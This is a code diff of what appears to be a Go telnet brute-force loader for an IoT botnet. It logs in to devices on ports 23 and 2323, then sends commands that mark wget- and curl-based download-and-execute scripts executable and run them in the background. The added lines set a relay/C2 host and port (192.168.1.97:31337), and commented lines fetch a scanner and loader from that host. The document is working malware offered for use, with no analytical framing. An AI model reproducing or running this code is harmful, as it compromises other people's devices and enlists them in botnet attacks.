@@ -9,7 +9,12 @@ import (
 	"os"
 )
 var (
-	__TIMEOUT__ = 3 *time.Second
+	__RELAY_H__   = "192.168.1.97"
+	__RELAY_P__   = 31337
+	__RELAY_PS_   = "||"
+	__TIMEOUT__   = 2 * time.Second
+	__C2DELAY__   = 5 * time.Second
+	__THREADS__   = 10
 )
 
 func login22(usr string , psw string){
@@ -62,8 +67,9 @@ func login23(usr string , psw string,ip string,port string){
 					//conn.Write([]byte("chmod +x loader"+"\n"))
 					conn.Write([]byte("chmod +x wget_download_exec.sh"+"\n"))
 					time.Sleep( 1 * time.Second)
-					conn.Write([]byte("./wget_download_exec.sh > /dev/null 2>&1 &"+"\n"))
-					time.Sleep( 1 * time.Second)
+					conn.Write([]byte("sh ./wget_download_exec.sh > /dev/null 2>&1 &"+"\n"))
+					time.Sleep( 60 * time.Second)
+					fmt.Println("Broken New Device")
 					return
 				}
 				if strings.Contains(s,"curl"){
@@ -72,8 +78,9 @@ func login23(usr string , psw string,ip string,port string){
 					time.Sleep( 3 * time.Second)
 					conn.Write([]byte("chmod +x curl_download_exec.sh"+"\n"))
 					time.Sleep( 1 * time.Second)
-					conn.Write([]byte("nohup ./curl_download_exec.sh > /dev/null 2>&1 &"+"\n"))
-					time.Sleep( 1 * time.Second)
+					conn.Write([]byte("sh ./curl_download_exec.sh > /dev/null 2>&1 &"+"\n"))
+					time.Sleep( 60 * time.Second)
+					fmt.Println("Broken New Device")
 					//conn.Write([]byte("curl http://192.168.1.97:31338/scanner -o scanner"+"\n"))
 					//conn.Write([]byte("curl http://192.168.1.97:31338/loader -o loader"+"\n"))
 					//conn.Write([]byte("chmod +x scanner"+"\n"))
@@ -87,20 +94,21 @@ func login23(usr string , psw string,ip string,port string){
 	}
 }
 
+
 func main(){
 
 	if len(os.Args)<1{
 		fmt.Println("Error")
 	}else{
-		switch os.Args[4] {
-			case "23":
-				//login23("admin","password","192.168.1.181","23")	
-				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
-			case "2323":
-				//login23("admin","password","192.168.1.181","23")	
-				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
-			case "22":
-				//login22(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
-		}
+			switch os.Args[4] {
+				case "23":
+					//login23("admin","password","192.168.1.181","23")						
+					login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
+				case "2323":
+					//login23("admin","password","192.168.1.181","23")	
+					login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
+				case "22":
+					//login22(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
+			}
 	}
 }
